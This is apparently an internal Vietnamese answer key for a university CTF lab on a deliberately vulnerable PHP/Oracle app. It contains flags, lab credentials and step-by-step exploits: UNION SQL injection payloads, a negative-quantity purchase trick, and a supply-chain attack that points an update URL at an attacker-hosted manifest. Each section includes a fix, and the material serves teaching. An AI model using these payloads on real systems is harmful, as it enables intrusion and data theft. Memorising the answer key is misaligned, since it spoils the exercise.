# 🔐 ANSWER KEY – DBS401 Group 02 (NỘI BỘ – KHÔNG NỘP CÔNG KHAI)

> Chỉ dùng trong lab CTF DBS401 nội bộ. Không chia sẻ trước khi thi/demo.

---

## 🚩 FLAG MASTER LIST

| Flag | Giá trị | Vị trí |
|------|---------|---------|
| Flag 1 | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (SQLi) |
| Flag 2 | `DBS401{LOGIC_GURU_2024}` | `store.php` (Business Logic) |
| Flag 3 | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `admin.php` (Supply Chain) |

## 🎭 FAKE FLAG LIST

| Fake Flag | Vị trí | Mục đích |
|-----------|--------|----------|
| `DBS401{FAKE_union_select_lol}` | FAKE_FLAGS table | Bẫy người dùng UNION đơn giản |
| `DBS401{FAKE_IDOR_wrong_student}` | FAKE_FLAGS table + decoy enrollment | Bẫy người tìm sai student ID |
| `DBS401{FAKE_blind_wrong_key_xd}` | ADMIN_SECRETS key=oracle_flag_3_backup | Bẫy người Blind SQLi vào secret_check.php |
| `DBS401{FAKE_archived_flag_123}` | FLAG_ARCHIVE table | Bẫy người tìm nhầm bảng |

---

## ═══════════════════════════════════════════════
## VULNERABILITY 1 – Oracle UNION-Based SQL Injection
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng:** Easy  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`  
**Tài khoản cần:** Bất kỳ (student1, teacher1, admin)

---

### Bước 1 – Xác nhận injection point

```
GET /search.php?q='
```
→ Nhận `Search failed. Please check your input.` → lỗi SQL bị suppress nhưng injection tồn tại.

```
GET /search.php?q=Software' AND '1'='1
```
→ Trả về kết quả bình thường → injection confirmed.

```
GET /search.php?q=Software' AND '1'='2
```
→ Không có kết quả → boolean behavior hoạt động.

---

### Bước 2 – Xác định số cột và kiểu dữ liệu

Query gốc có 3 cột: `student_id (NUMBER)`, `full_name (VARCHAR2)`, `major (VARCHAR2)`

```sql
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1
```
→ 3 NULLs cho ra 1 row → 3 cột ✓

```sql
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1
```
→ Cột 1 là NUMBER, cột 2 là VARCHAR2 ✓

---

### Bước 3 – Khám phá Oracle metadata

```sql
' UNION SELECT 1,USER,NULL FROM DUAL WHERE '1'='1
```
→ `DBS401_USER`

```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1
```
→ `USERS, STUDENTS, COURSES, ENROLLMENTS, AUDIT_LOGS, ...`

Tiếp tục enumerate với NOT IN để tìm thêm:
→ `FLAGS, ADMIN_SECRETS, CONFIG_STORE, FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE`

⚠️ `FLAG_ARCHIVE` trông giống bảng flag → **đây là DECOY!**

---

### Bước 4 – Lấy Flag Part A từ FLAGS table

```sql
' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE flag_code='FL1_PART_A' AND is_active=1 AND ROWNUM=1 AND '1'='1
```
→ `flag_part = 4442533430317B53514C5F`

> **Decode hex:**  
> `4442533430317B53514C5F` → **`DBS401{SQL_`**

⚠️ `FL_DECOY_B` cũng có is_active=1 → kết quả là chuỗi base64 vô nghĩa → **FAKE!**

---

### Bước 5 – Lấy Flag Part B từ AUDIT_LOGS

```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
```
→ `{"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context",...}`

> **Decode:** `fragment = _n01tc3jn1`  
> Hint `reverse_for_context` → đảo ngược → **`1nj3ct10n_`**

---

### Bước 6 – Lấy Flag Part C từ CONFIG_STORE

```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1
```
→ `MHI0Y2wzIX0=`

> **Decode base64:** `MHI0Y2wzIX0=` → **`0r4cl3!}`**

⚠️ `sys_beta_marker` → fake base64 → **FAKE!**

---

### Bước 7 – Ghép Flag 1

```
Part A (hex decode):    DBS401{SQL_
Part B (reverse):       1nj3ct10n_
Part C (base64 decode): 0r4cl3!}

FLAG 1 = DBS401{SQL_1nj3ct10n_0r4cl3!}
```

✅ **FLAG 1: `DBS401{SQL_1nj3ct10n_0r4cl3!}`**

---

### Cách vá lỗi

```php
// Vulnerable:
$sql = "... WHERE full_name LIKE '%$keyword%' ...";

// Secure:
$param = '%' . $keyword . '%';
$sql   = "... WHERE full_name LIKE :kw ...";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 2 – Insecure Business Logic (Negative Quantity)
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng:** Hard  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `POST /dbs401-oracle-app/store.php`  
**Tài khoản cần:** Bất kỳ sinh viên (student1, student2, ...)

---

### Bước 1 – Phân tích rào cản tài chính

1. Đăng nhập student1 (`Student@123`).
2. Truy cập `store.php`.
3. Quan sát số dư Credits (ví dụ: 150 Credits).
4. Thấy "Exam Leak 2024 (CLASSIFIED)" giá **999,999 Credits** → không thể mua được.

### Bước 2 – Khai thác lỗ hổng

1. Tìm ô nhập số lượng (`quantity`) của item bất kỳ (ví dụ: "Advanced Security Guide" giá 100 Credits).
2. Nhập số lượng âm cực lớn: `-20000`.
3. Submit form.

**Giải thích:**
```
cost     = -20000 × 100       = -2,000,000
newCredit = 150 - (-2,000,000) = 2,000,150
```
→ Số dư tăng lên ~2 triệu Credits.

### Bước 3 – Lấy Flag 2

Với số dư > 999,999 Credits, quay lại `store.php` → mục "Exam Leak 2024 (CLASSIFIED)" hiển thị FLAG.

✅ **FLAG 2: `DBS401{LOGIC_GURU_2024}`**

---

### Cách vá lỗi

```php
// Vulnerable – không kiểm tra $qty > 0
$cost = $qty * $price;
if ($credits >= $cost) { ... }

// Secure – thêm kiểm tra giá trị dương
if ($qty <= 0) {
    $msg = "Quantity must be a positive number.";
} elseif ($credits >= $cost) {
    $newCredits = $credits - $cost;
    // ...
}
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 3 – Supply Chain Poisoning + Broken Access Control
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng:** Hard (Chained Attack)  
**Mức độ tìm flag:** Very Hard  
**Endpoint recon:** `search.php?q=...`  
**Endpoint đổi cấu hình:** `partner_config.php`  
**Endpoint trigger:** `admin.php?check_updates=1`  
**Tài khoản cần:** `student1 / Student@123` để đổi URL; `admin / Admin@DBS401!2024` để trigger update.

---

### Bước 1 – Reconnaissance via SQLi (Vuln 1)

Dùng SQLi tại `search.php` để đọc `CONFIG_STORE`:

```sql
%' AND 1=2) UNION SELECT 1,c.config_key,c.config_value
FROM CONFIG_STORE c, STUDENTS s
WHERE c.config_key='update_url'
  AND s.hidden_marker='NORMAL'
  AND ROWNUM=1--
```

→ Phát hiện:
- `update_url` = `http://127.0.0.1:8081/manifest.json`
- app đang dùng manifest JSON.

Đọc thêm version:

```sql
%' AND 1=2) UNION SELECT 1,c.config_key,c.config_value
FROM CONFIG_STORE c, STUDENTS s
WHERE c.config_key='app_version'
  AND s.hidden_marker='NORMAL'
  AND ROWNUM=1--
```

→ `app_version = 3.1.0`

**Suy luận:** nếu manifest trả `version` lớn hơn `3.1.0`, `admin.php?check_updates=1` sẽ đi vào nhánh update successful.

---

### Bước 2 – Tìm endpoint cấu hình Partner bị lỗi quyền

Endpoint `partner_config.php` không nằm trên navbar, nhưng tồn tại trong webroot. Sau khi login bằng `student1`, truy cập:

```text
/dbs401-oracle-app/partner_config.php
```

Trang này ghi “ADMIN ONLY” nhưng code chỉ kiểm tra đăng nhập, **không kiểm tra `$_SESSION['role'] === 'admin'`**. Vì vậy user thường có thể đổi `CONFIG_STORE.update_url`.

---

### Bước 3 – Chuẩn bị Partner Server Giả Mạo

Manifest độc hại chỉ chứa **nửa đầu hex** của Flag 3. Nửa sau nằm server-side trong `admin.php` dưới dạng `FLAG3_LOCAL_HEX_SUFFIX`.

```bash
mkdir -p /tmp/partner-fake
cat > /tmp/partner-fake/manifest.json << 'EOF'
{
  "version": "9.9.9",
  "status": "critical_update",
  "checksum": "deadbeef1337",
  "flag_part": "4442533430317b3575707031795f436834"
}
EOF
cd /tmp/partner-fake
python3 -m http.server 8081 --bind 0.0.0.0
```

Nếu target và attacker khác máy, dùng URL mà target truy cập được, ví dụ:

```text
http://192.168.102.3:8081/manifest.json
```

---

### Bước 4 – Đổi `update_url` qua `partner_config.php`

Đăng nhập `student1`, gửi POST:

```bash
curl -s -b student_cookies.txt -c student_cookies.txt   -X POST "$TARGET/partner_config.php"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode "manifest_url=http://192.168.102.3:8081/manifest.json"
```

→ `Partner manifest URL updated successfully.`

Đây là điểm khác với flow cũ: **không cần SQLPlus**, không dùng stacked SQLi; lỗi chính ở bước đổi URL là Broken Access Control.

---

### Bước 5 – Trigger update bằng admin

Đăng nhập admin và gọi:

```bash
curl -s -b admin_cookies.txt "$TARGET/admin.php?check_updates=1"
```

Flow server-side:

```text
admin.php đọc CONFIG_STORE.update_url
→ file_get_contents(manifest_url)
→ JSON version 9.9.9 > APP_VERSION 3.1.0
→ lấy manifest['flag_part']
→ ghép với FLAG3_LOCAL_HEX_SUFFIX trong admin.php
→ hex2bin()
→ hiển thị plaintext flag
```

---

### Bước 6 – Kết quả Flag 3

Manifest cung cấp nửa đầu:

```text
4442533430317b3575707031795f436834
```

`admin.php` ghép với suffix server-side:

```text
316e5f50303135306e316e675f303931327d
```

Full hex sau khi ghép:

```text
4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
```

Decode ra:

```text
DBS401{5upp1y_Ch41n_P0150n1ng_0912}
```

✅ **FLAG 3: `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**

---

### Cách vá lỗi

1. `partner_config.php`: bắt buộc admin role trước khi update `CONFIG_STORE.update_url`.
2. `partner_config.php`: chỉ cho phép URL trong allowlist.
3. `admin.php`: validate URL trước khi fetch, chặn IP nội bộ/metadata, timeout ngắn.
4. `admin.php`: manifest phải có chữ ký số/HMAC hợp lệ; không tin `flag_part` hay payload từ đối tác nếu chưa verify.

```php
if ($_SESSION['role'] !== 'admin') {
    http_response_code(403);
    exit;
}

$allowedUpdateUrls = [
    'http://127.0.0.1:8081/manifest.json',
    'https://cdn.fpt-partner.net/v3/manifest.json'
];

if (!in_array($manifestUrl, $allowedUpdateUrls, true)) {
    $msg = 'Blocked: manifest URL is not approved.';
}
```

---

## 📸 Screenshots cần chụp khi demo

| STT | Cần chụp gì |
|-----|-------------|
| 1 | `search.php` với payload UNION SELECT (xác nhận injection) |
| 2 | Kết quả query `USER_TABLES` (danh sách bảng) |
| 3 | Kết quả query `FLAGS` → `flag_part` hex |
| 4 | Kết quả query `AUDIT_LOGS` → `fragment` reversed |
| 5 | Kết quả query `CONFIG_STORE` → `base64` value |
| 6 | `decode_helper.py --assemble` → ghép → Flag 1 |
| 7 | `store.php` với số dư Credits thấp |
| 8 | `store.php` với `quantity = -20000` và thông báo Credits tăng |
| 9 | `store.php` với số dư Credits cao và Flag 2 hiển thị |
| 10 | SQLi tìm `update_url` và `app_version` trong CONFIG_STORE |
| 11 | Fuzz/truy cập `partner_config.php` bằng user thường |
| 12 | POST `manifest_url` mới qua `partner_config.php` thành công |
| 13 | Fake partner server đang chạy và nhận request từ target |
| 14 | `admin.php?check_updates=1` → Flag 3 plaintext hiển thị |
| 15 | Secure versions so sánh trước/sau vá (search, store, partner_config, admin) |

---

## 🔑 Tài khoản test

| Username | Password | Role |
|----------|----------|------|
| admin | `Admin@DBS401!2024` | admin |
| teacher1 | `Teacher@123` | teacher |
| student1 | `Student@123` | student |
| student2 | `Student@123` | student |
| student3 | `Student@123` | student |

---

*Tài liệu này chỉ dùng nội bộ nhóm DBS401 – Group 02.*